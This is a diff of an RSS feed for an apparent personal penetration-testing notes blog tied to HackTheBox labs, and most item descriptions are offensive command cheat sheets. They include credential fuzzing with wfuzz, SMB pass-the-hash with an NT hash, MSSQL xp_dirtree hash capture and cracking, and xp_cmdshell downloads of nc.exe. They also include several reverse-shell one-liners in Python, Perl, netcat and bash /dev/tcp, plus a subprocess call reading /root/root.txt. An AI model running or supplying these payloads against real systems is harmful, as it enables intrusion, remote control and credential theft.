@@ -16,7 +16,9 @@
       <pubDate>Sat, 19 Jan 2019 22:13:07 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/fuzz/</guid>
-      <description>wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d &#34;username=FUZZ&amp;password=pass&#34; -hs &#34;not found&#34; http://10.10.10.10/login.php wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -b PHPSESSID=096qe8a48h34hp3d3gfgr3cfr5 --hh 375 http://docker.hackthebox.eu:38821/panel.php?info=FUZZ  Fuzzing with ZAP request -&amp;gt; right click –&amp;gt; attack –&amp;gt; fuzzer</description>
+      <description>Wfuzz wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d &amp;ldquo;username=FUZZ&amp;amp;password=pass&amp;rdquo; -hs &amp;ldquo;not found&amp;rdquo; http://10.10.10.10/login.php
+wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ &amp;ndash;hh 324 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -b PHPSESSID=096qe8a48h34hp3d3gfgr3cfr5 &amp;ndash;hh 375 http://docker.hackthebox.eu:38821/panel.php?info=FUZZ 
+Fuzzing with ZAP request -&amp;gt; right click –&amp;gt; attack –&amp;gt; fuzzer</description>
     </item>
     
     <item>
@@ -25,7 +27,7 @@
       <pubDate>Sat, 19 Jan 2019 22:13:07 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/impacket/</guid>
-      <description>Impacket psexec.py administrator@10.10.10.10</description>
+      <description> Impacket psexec.py administrator@10.10.10.10 ### use case 1  ./mssqlclient.py HOST/user1:pass1@10.10.10.1 -db volume -windows-auth EXEC master..xp_dirtree &#39;\\10.10.16.35\test&#39; responder -I tun0 -i 10.10.15.230 john -format=netntlmv2 hash --wordlist=/usr/share/wordlists/rockyou.txt ./mssqlclient.py HOST/user2:pass2@10.10.10.1 -db volume -windows-auth xp_cmdshell powershell Invoke-WebRequest http://10.10.10.2:8000/file.exe -OutFile c:\Users\mssql-svc\Downloads\file1.exe enable_xp_cmdshell RECONFIGURE xp_cmdshell powershell Invoke-WebRequest http://10.10.14.90:8000/nc.exe -OutFile c:\Users\mssql-svc\Downloads\nc.exe xp_cmdshell c:\Users\mssql-svc\Downloads\nc.exe nc.exe 192.168.100.113 4444 –e cmd.exe dir Groups.xml /s gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/asdasdasdasdasdasdasd  </description>
     </item>
     
     <item>
@@ -52,9 +54,8 @@
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/domain/</guid>
-      <description>sublist3r
-#vhost enum nmap &amp;ndash;script http-vhosts -p 80,443 10.10.10.113 
- git clone https://github.com/jobertabma/virtual-host-discovery ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  </description>
+      <description>vhost enumeration nmap &amp;ndash;script http-vhosts -p 80,443 10.10.10.113 
+ git clone https://github.com/jobertabma/virtual-host-discovery ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  nmap --script dns-brute friendzone.red sublist3r -b -d friendzone.red Domain transfer dig +nocmd axfr @10.10.10.1 example.com +noall +answer</description>
     </item>
     
     <item>
@@ -105,8 +106,7 @@ john &amp;ndash;format=netntlmv2 hash.txt &amp;ndash;wordlist=/usr/share/wordlis
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/python/</guid>
-      <description>cat users.txt | python -m json.tool
-python -m SimpleHTTPServer 8000</description>
+      <description>cat users.txt | python -m json.tool python -m SimpleHTTPServer 8000 from subprocess import call call(&#39;cat /root/root.txt  /tmp/output&#39;, shell=True) from subprocess import call call(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;1|nc 10.10.14.132 5555 /tmp/f&#39;, shell=True) </description>
     </item>
     
     <item>
@@ -124,7 +124,8 @@ python -m SimpleHTTPServer 8000</description>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/smb/</guid>
-      <description>smbclient #user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY -L 10.10.10.107 #Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY \\\\10.10.10.107\\alice  smbmap smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com -R smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com --download file crackmapexec crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;shares</description>
+      <description>smbclient #user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY -L 10.10.10.107 smbclient -L //10.10.10.1/ #Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY \\\\10.10.10.107\\alice  smbmap smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com -R smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com --download file crackmapexec crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;shares
+Nmap nmap -T4 -v -oA shares &amp;ndash;script smb-enum-shares &amp;ndash;script-args smbuser=username,smbpass=password -p445 10.</description>
     </item>
     
     <item>
@@ -174,10 +175,10 @@ tar cf /dev/null ~/b &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/shell-reverse/</guid>
-      <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
+      <description>connect  python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
-
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.132 5555 &amp;gt;/tmp/f 
 reverse  bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.113&amp;frasl;443 0&amp;gt;&amp;amp;1
 &amp;rsquo;/bin/bash -c &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1&amp;frasl;2323 0&amp;gt;&amp;amp;1&amp;rsquo; 
 listen  nc -lvp 443
